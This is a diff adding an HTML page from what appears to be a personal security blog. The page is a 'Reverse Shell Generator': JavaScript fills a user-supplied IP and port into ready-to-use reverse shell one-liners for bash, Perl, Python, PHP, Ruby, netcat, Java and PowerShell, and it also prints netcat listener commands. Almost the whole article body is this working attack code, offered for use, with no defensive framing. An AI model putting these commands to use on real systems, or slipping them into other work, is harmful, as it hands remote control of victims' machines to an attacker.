@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Reverse Shell Generator    HANDLER COMMAND  BASH REVERSE SHELL  PERL REVERSE SHELL  PYTHON REVERSE SHELL  PYTHON3 REVERSE SHELL  PHP REVERSE SHELL  RUBY REVERSE SHELL  NETCAT REVERSE SHELL  JAVA REVER">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Reverse Shell Generator">
+<meta property="og:url" content="http://example.com/tools/reverse-shell-generator/index.html">
+<meta property="og:site_name" content="LØNE&#39;s Blog">
+<meta property="og:description" content="Reverse Shell Generator    HANDLER COMMAND  BASH REVERSE SHELL  PERL REVERSE SHELL  PYTHON REVERSE SHELL  PYTHON3 REVERSE SHELL  PHP REVERSE SHELL  RUBY REVERSE SHELL  NETCAT REVERSE SHELL  JAVA REVER">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-04-20T03:12:15.000Z">
+<meta property="article:modified_time" content="2022-07-11T04:37:00.648Z">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/takeda_favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/android-chrome-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/t-apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Reverse Shell Generator</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+    <div class="content index py4">
+        
+          <header id="header">
+  <a href="/">
+  
+    
+      <div id="logo" style="background-image: url(/images/takeda_white_small.png);"></div>
+    
+  
+    <div id="title">
+      <h1>LØNE&#39;s Blog</h1>
+    </div>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#" aria-label="Menu"><i class="fas fa-bars fa-2x"></i></a>
+      </li>
+      <!--
+     --><li><a href="/">Home</a></li><!--
+   --><!--
+     --><li><a href="/about/">About</a></li><!--
+   --><!--
+     --><li><a href="/archives/">Writing</a></li><!--
+   --><!--
+     --><li><a target="_blank" rel="noopener" href="http://github.com/kagehayashi">Projects</a></li><!--
+   --><!--
+     --><li><a href="/search/">Search</a></li><!--
+   --><!--
+     --><li><a href="/tags/">Tags</a></li><!--
+   --><!--
+     --><li><a href="/tools/">Tools</a></li><!--
+   --><!--
+     --><li><a href="/cheatsheets/">Cheat Sheets</a></li><!--
+   -->
+    </ul>
+  </div>
+</header>
+
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  
+
+  <div class="content" itemprop="articleBody">
+      
+          <h1>Reverse Shell Generator</h1>
+
+<p><textarea rows="1" style="width: 20%; box-sizing: border-box;resize: none;" id="ip" placeholder="IP ADDRESS"></textarea>
+<textarea rows="1" style="width: 10%; box-sizing: border-box;resize: none;" id="port" placeholder="PORT"></textarea><br>
+HANDLER COMMAND<br>
+<textarea rows="3" style="width: 50%; box-sizing: border-box;" id="handler" onclick="this.focus();" readonly></textarea></p>
+BASH REVERSE SHELL
+<textarea rows="5" style="width: 100%; box-sizing: border-box;" id="bash" onclick="this.focus();" readonly></textarea></p>
+PERL REVERSE SHELL
+<textarea rows="8" style="width: 100%; box-sizing: border-box;" id="perl" onclick="this.focus(); " readonly></textarea></p>
+PYTHON REVERSE SHELL
+<textarea rows="9" style="width: 100%; box-sizing: border-box;" id="python" onclick="this.focus(); " readonly></textarea></p>
+PYTHON3 REVERSE SHELL
+<textarea rows="9" style="width: 100%; box-sizing: border-box;" id="python3" onclick="this.focus(); " readonly></textarea></p>
+PHP REVERSE SHELL
+<textarea rows="12" style="width: 100%; box-sizing: border-box;" id="php" onclick="this.focus(); " readonly></textarea></p>
+RUBY REVERSE SHELL
+<textarea rows="6" style="width: 100%; box-sizing: border-box;" id="ruby" onclick="this.focus(); " readonly></textarea></p>
+NETCAT REVERSE SHELL
+<textarea rows="9" style="width: 100%; box-sizing: border-box;" id="netcat" onclick="this.focus(); " readonly></textarea></p>
+JAVA REVERSE SHELL
+<textarea rows="2" style="width: 100%; box-sizing: border-box;" id="java" onclick="this.focus(); " readonly></textarea></p>
+POWERSHELL REVERSE SHELL
+<textarea rows="2" style="width: 100%; box-sizing: border-box;" id="powershell" onclick="this.focus(); " readonly></textarea></p>
+
+<br>
+
+
+<script>
+var IP = document.querySelector('textarea#ip');
+var PORT = document.querySelector('textarea#port');
+
+
+var BASH="bash -i >& /dev/tcp/[IP]/[PORT] 0>&1"+"\n\n"
+
+var PERL="perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"[IP]:[PORT]\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n\n"
++"perl -e 'use Socket;$i=\"[IP]\";$p=[PORT];socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+
+var PYTHON = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[IP]\",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"
++"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[IP]\",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'"
+
+var PYTHON3 ="python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[IP]\",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"
++"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[IP]\",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'"
+
+var PHP = "php -r '$sock=fsockopen(\"[IP]\",[PORT]);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n\n"
++"php -r '$s=fsockopen(\"[IP]\",[PORT]);shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n\n"
++"php -r '$s=fsockopen(\"[IP]\",[PORT]);`/bin/sh -i <&3 >&3 2>&3`;'\n\n"
++"php -r '$s=fsockopen(\"[IP]\",[PORT]);system(\"/bin/sh -i <&3 >&3 2>&3\");'\n\n"
++"php -r '$s=fsockopen(\"[IP]\",[PORT]);popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'\n\n"
++"php -r '$sock=fsockopen(\"[IP]\",[PORT]); $proc = proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);'"
+
+var RUBY = "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"[IP]\",\"[PORT]\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\n\n"
++"ruby -rsocket -e'f=TCPSocket.open(\"[IP]\",[PORT]).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+
+var NETCAT = "nc -c /bin/sh [IP] [PORT]\n\n"
++"nc -e /bin/sh [IP] [PORT]\n\n"
++"/bin/sh | nc [IP] [PORT]\n\n"
++"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP] [PORT] >/tmp/f\n\n"
++"rm -f /tmp/p; mknod /tmp/p p && nc [IP] [PORT] 0/tmp/p"
+
+var JAVA = "Runtime.getRuntime();p = r.exec([\"/bin/sh\",\"-c\",\"exec 5<>/dev/tcp/[IP]/[PORT];cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]);p.waitFor();"
+
+var POWERSHELL = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"[IP]\",[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n\n"
++"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('[IP]',[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
+
+
+function processInput() {
+    handler.value = "MAC: nc -l "+ PORT.value +"\n"
+    + "LINUX: nc -lvvp "+ PORT.value + "\n"
+    + "WINDOWS: nc.exe -l -p" + PORT.value+"\n"
+    bash.value = format(BASH);
+    perl.value = format(PERL);
+    python.value = format(PYTHON);
+    python3.value = format(PYTHON3);
+    php.value = format (PHP);
+    ruby.value = format(RUBY);
+    netcat.value = format(NETCAT);
+    java.value = format(JAVA);
+    powershell.value = format(POWERSHELL);
+}
+
+function format(str){
+    return str.replace(/\[IP\]/g,IP.value).replace(/\[PORT\]/g,PORT.value);
+}
+
+    ip.addEventListener('input', processInput, false);
+    port.addEventListener('input', processInput, false);
+</script>
+        
+  </div>
+</article>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2022
+    LØNE&#39;s Blog
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/kagehayashi">Projects</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/tools/">Tools</a></li><!--
+     --><!--
+       --><li><a href="/cheatsheets/">Cheat Sheets</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
